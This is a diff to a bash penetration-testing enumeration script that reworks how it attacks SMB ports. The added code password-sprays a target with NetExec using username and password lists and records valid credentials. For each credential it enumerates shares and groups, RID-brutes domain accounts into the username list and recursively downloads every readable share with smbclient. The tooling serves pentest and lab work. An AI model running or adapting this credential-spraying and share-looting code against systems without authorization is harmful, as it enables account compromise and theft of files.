@@ -176,28 +176,31 @@ for port in $open_ports; do
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
             echo 'Enumerating SMB can take some time please wait...'
             mkdir -p "$enumx_dir"/smb 2>/dev/null
-            if [ "$using_creds" == true ]; then
-                shares=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --shares --continue-on-success)
-                groups=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --groups)
-                ridbrute=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --rid-brute) 
-                read credu credp <<< $(echo "$shares" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | sed 's/:/ /')
-                if [ "$credu:$credp" != ":" ]; then
-                    echo "$credu:$credp" | tee -a "$enumx_dir/creds"
-                fi
-                list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
-                echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"              
-                echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
-                echo
-                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
-                echo
-                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
-                echo
-                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
-                echo
-                for share in "${list_shares[@]}"; do
-                    echo "Authenticating as $credu:$credp on share $share..."
-                    smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
-		done
+          	if [ "$using_creds" == true ]; then
+          		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success)
+  		            echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
+  		            sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
+	           	for cred in $(cat "$enumx_dir"/creds); do
+	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+   		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
+   		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
+   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute)
+                    list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
+                    echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"              
+ 	            	echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
+ 	                echo
+ 	                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
+ 	                echo
+ 	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
+ 	                echo
+ 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
+ 	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
+ 	                echo
+ 	                for share in "${list_shares[@]}"; do
+ 	                    echo "Authenticating as $credu:$credp on share $share..."
+ 	                    smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
+ 	                done
+   		        done
             else
                 default_usernames=("guest" "")
                 for user in "${default_usernames[@]}"
@@ -243,7 +246,7 @@ for port in $open_ports; do
             ;;
         445)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-            echo 'Enumerating SMB can take some time please wait...'
+            echo "Enumerating port $port can take some time please wait..."
             mkdir -p "$enumx_dir"/smb 2>/dev/null
           	if [ "$using_creds" == true ]; then
           		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success)
@@ -263,6 +266,7 @@ for port in $open_ports; do
  	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
  	                echo
  	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
+ 	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
  	                echo
  	                for share in "${list_shares[@]}"; do
  	                    echo "Authenticating as $credu:$credp on share $share..."
